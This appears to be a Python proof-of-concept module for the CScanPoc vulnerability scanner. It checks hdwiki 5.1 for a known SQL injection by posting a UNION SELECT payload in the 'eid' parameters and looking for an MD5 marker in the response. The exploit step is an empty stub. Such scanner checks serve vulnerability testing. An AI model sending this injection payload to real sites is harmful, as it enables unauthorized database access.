# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Hdwiki_0000' # 平台漏洞编号，留空
    name = 'hdwiki5.1 SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-26'  # 漏洞公布时间
    desc = '''
        hdwiki5.1 SQL注入漏洞s
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/2978/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'hdwiki'  # 漏洞应用名称
    product_version = '5.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b007d196-5e49-49ec-8de1-551bd81f7f57'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)+'/index.php?edition-compare-1'
            post_data_test=' "eid[0]=2&eid[1]=19&eid[2]=-3) UNION SELECT 1,2,35,4,5,6,7,8,9,10,11,12,md5(123),14,15,16,17,18,19 %23" '
            code,head,body,errcode,fina_url= hh.http('-d'+post_data_test+url)
                       
            if code == 200 and '202cb962ac59075b964b07152d234b70' in body :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()